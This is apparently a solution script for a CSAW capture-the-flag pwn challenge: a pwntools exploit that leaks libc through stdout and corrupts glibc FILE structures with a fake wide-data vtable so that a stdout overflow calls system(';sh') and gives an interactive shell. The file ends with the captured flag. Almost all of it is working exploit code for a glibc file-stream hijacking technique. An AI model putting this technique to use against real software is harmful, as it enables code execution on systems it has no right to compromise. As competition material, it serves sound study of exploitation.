#!/usr/bin/python3
from pwn import *
from sys import argv

e = context.binary = ELF('./chal_patched')
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-aarch64.so.1', checksec=False)
if len(argv) > 1:
    MSB = 0xffff
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    MSB = 0x55
    conn = lambda: e.process()
    #conn = lambda: gdb.debug(["./chal_patched"])

def dump():
    p.send(p64(0xfbad2887 | 0x1000)+p64(0)*3+p8(0x00))
    time.sleep(1)
    p.send(p8(libc.sym._IO_stdfile_1_lock & 0xff))

    p.recvn(0x18)
    _IO_file_jumps = p.u64()
    log.info("_IO_file_jumps: %#x", _IO_file_jumps)
    assert _IO_file_jumps == libc.sym._IO_file_jumps

p = conn()

stdout = (MSB << 32) + (u16(p.recvn(2)) << 16) + ((libc.sym._IO_2_1_stdout_) & 0xffff)
log.info("stdout: %#x", stdout)

libc.address = stdout - libc.sym._IO_2_1_stdout_
log.info("libc: %#x", libc.address)

p.send(flat({
    # _flags: !_IO_UNBUFFERED | IO_USER_LOCK | _IO_NO_WRITES | _IO_USER_BUF
    0x00: 0x8000 | 8 | 1,

    # step.__fct
    0x10: libc.sym.gets,

    # _IO_write_ptr > _IO_write_base
    0x20: 0,    # _IO_write_base
    0x28: 4,    # _IO_write_ptr ( (ptr-base)/4 > 0 )

    #0x30: 0,    # _IO_write_end

    # wide->write_ptr < wide->write_base
    0x38: 0,    # _IO_buf_base
    # 0x40: _IO_buf_end

    # 0x40: 0,
}, length=0x40))

"""
wide_data+0x18: write_base
wide_data+0x20: write_ptr
wide_data+0x68: step*

step+0x00: NULL (to not use pointer mangling)
step+0x28: func
"""


p.send(flat({
    # _lock:
    0x88: libc.sym._IO_stdfile_1_lock,

    # codevct.cd_out.step
    0x90: stdout+0x10 - 0x28,

    # _codevct
    0x98: stdout+0x90-0x38,

    # # _wide_data
    0xa0: stdout+0x20 - 0x18,

    # _mode > 0
    0xc0: 1,

    # 0xc8: 0,
}, length=0x40+0x88)[0x88:])

# payload to call _IO_wfile_overflow (https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/wfileops.c#L406)
# when _IO_OVERFLOW on `stdout` is triggered inside of gets() (https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L501)
fake_io_addr = stdout - 0x10
fake = flat(
    {
        # need _IO_LINKED and _IO_LINE_BUF
        0x0: p16(0x80 | 0x200) + b"  " + b";sh",

        # start of old _IO_2_1_stdin_
        0x0+0x10: 0,    # old flags

        0x28: libc.sym.system,  # _IO_write_ptr

        #0x68+0x10: fake_io_addr,                 # old _chain
        0x88+0x10: libc.sym._IO_stdfile_1_lock,  # old lock

        0x88: libc.sym._IO_stdfile_1_lock,  # lock
        0xA0: fake_io_addr + 0xD0 - 0xE0,  # _wide_data->_wide_vtable
        0xD0: fake_io_addr + 0x28 - 0x68,  # _wide_data->_wide_vtable->doallocate
        0xD8: libc.sym["_IO_wfile_jumps"],  # vtable _IO_wfile_jumps-0x48
    },
    filler=b"\x00",
    length=0xe0
)

overwrite  = p64(0)
# start of new stdout
overwrite += fake
# pad upto stderr and stdout
overwrite += p64(0)*2
overwrite += p64(libc.sym._IO_2_1_stderr_)  # stderr
# overwrite LSB of `stdout` to point to new fake stdout
# then on reading the next char in gets(), this gets overflowed
overwrite += p8(fake_io_addr & 0xff)        # stdout

assert b"\n" not in overwrite
p.sendline(overwrite)

p.interactive()
# csawctf{4y3_c4pt41n_bu7_411_5cr0115_4nd_n0_jump5_m4k3_17_4_du11_109_ak2MM9dwbE8E0bw}